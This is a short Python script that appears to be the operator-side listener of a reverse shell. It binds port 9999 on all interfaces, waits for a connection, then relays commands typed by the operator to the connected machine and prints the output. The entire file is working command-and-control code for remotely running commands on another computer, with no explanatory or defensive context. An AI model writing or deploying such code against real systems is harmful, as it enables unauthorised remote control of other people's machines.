import socket
import sys

def initsoc():
    try:
        global host
        global port
        global s
        port=9999
        host=''
        s=socket.socket()
    except socket.error as msg:
        print(str(msg))

def  bindsoc():
    try:
        print('binding port '+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print(str(msg))
        bindsoc()




def acceptcon():
    conn,adress=s.accept()
    sendcommand(conn)
    conn.close()


def sendcommand(c):
    while True:
        cmd=input('input command ')
        if cmd == 'quit':
            c.close()
            s.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0:
            c.send(str.encode(cmd))
            res=str(c.recv(1024),'utf-8')
            print(res,end='')


def exec():
    initsoc()
    bindsoc()
    acceptcon()

exec() 